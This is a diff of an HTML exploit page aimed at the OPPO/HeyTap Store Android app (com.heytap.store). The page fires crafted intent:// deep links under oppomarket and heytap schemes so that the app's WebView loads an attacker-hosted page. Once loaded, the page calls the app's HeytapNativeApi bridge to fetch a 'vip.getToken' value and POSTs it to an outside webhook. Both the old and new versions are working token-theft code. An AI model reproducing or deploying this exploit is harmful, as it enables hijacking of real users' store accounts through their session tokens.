@@ -6,23 +6,21 @@
     <title>OPPO Store Exploit Test</title>
     <style>
         body { font-family: sans-serif; text-align: center; padding: 20px; background-color: #f8f9fa; }
-        .btn { width: 100%; max-width: 320px; padding: 18px; margin: 10px 0; font-size: 16px; color: white; border: none; border-radius: 12px; cursor: pointer; font-weight: bold; }
-        .p1 { background-color: #008f39; } /* /credits */
-        .p2 { background-color: #007bff; } /* /webview */
-        .p3 { background-color: #6f42c1; } /* /main */
-        .p4 { background-color: #dc3545; } /* /index */
+        .btn { width: 100%; max-width: 340px; padding: 18px; margin: 10px 0; font-size: 16px; color: white; border: none; border-radius: 12px; cursor: pointer; font-weight: bold; }
+        .p1 { background-color: #ff6600; } /* Standard Intent */
+        .p2 { background-color: #007bff; } /* Heytap Scheme */
+        .p3 { background-color: #28a745; } /* Direct WebView Intent */
         #log { text-align: left; background: #333; color: #0f0; padding: 15px; font-family: monospace; font-size: 11px; margin-top: 20px; border-radius: 8px; overflow-x: auto; }
     </style>
 </head>
 <body>
 
-    <h2>OPPO Store Deep Link Brute Force</h2>
-    <p>Target: <b>com.heytap.store</b></p>
+    <h2>OPPO Store Deep Link Bypass</h2>
+    <p>Targeting: <b>com.heytap.store</b></p>
 
-    <button class="btn p1" onclick="launch('credits')">Path: /credits</button>
-    <button class="btn p2" onclick="launch('webview')">Path: /webview</button>
-    <button class="btn p3" onclick="launch('main')">Path: /main</button>
-    <button class="btn p4" onclick="launch('index')">Path: /index</button>
+    <button class="btn p1" onclick="launchIntent()">1. Standard Intent (com.heytap.store)</button>
+    <button class="btn p2" onclick="launchHeytap()">2. Heytap Scheme (heytap://)</button>
+    <button class="btn p3" onclick="launchDirect()">3. Direct WebView Action</button>
 
     <div id="log">Console Logs:<br></div>
 
@@ -35,26 +33,34 @@
             document.getElementById("log").innerHTML += "> " + msg + "<br>";
         }
 
-        function launch(path) {
-            log("Attempting Path: /" + path);
-            
-            // This format attempts to bypass Chrome's security by specifying the exact package
-            // We use the 'oppomarket' scheme as it is the most common across HeyTap
-            const intent = `intent://#Intent;action=android.intent.action.VIEW;data=https://pk009900.github.io/my-oppo-test/;package=${pkg};end`;
-            
+        function launchIntent() {
+            log("Launching Standard Intent...");
+            const intent = `intent://credits?url=${targetUrl}#Intent;scheme=oppomarket;package=${pkg};S.browser_fallback_url=${targetUrl};end`;
             window.location.href = intent;
         }
 
-        // Bridge Logic: This runs ONLY if the app successfully opens the page
+        function launchHeytap() {
+            log("Launching Heytap Scheme...");
+            const intent = `intent://web?url=${targetUrl}#Intent;scheme=heytap;package=${pkg};S.browser_fallback_url=${targetUrl};end`;
+            window.location.href = intent;
+        }
+
+        function launchDirect() {
+            log("Launching Direct WebView Action...");
+            // This attempts to trigger the VIEW action directly for the package
+            const intent = `intent:${targetUrl}#Intent;action=android.intent.action.VIEW;package=${pkg};end`;
+            window.location.href = intent;
+        }
+
         window.onload = function() {
             if (window.HeytapNativeApi) {
-                log("!!! BRIDGE DETECTED !!!");
+                log("<b style='color:white'>BRIDGE INJECTED! CAPTURING...</b>");
                 window.HeytapNativeApi.invoke("vip.getToken", (data) => {
-                    log("Token stolen! Sending to Webhook...");
                     fetch(webhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
+                    log("SUCCESS: Token sent to Webhook.");
                 });
             } else {
-                log("System Ready. Click a button.");
+                log("Environment Ready.");
             }
         };
     </script>
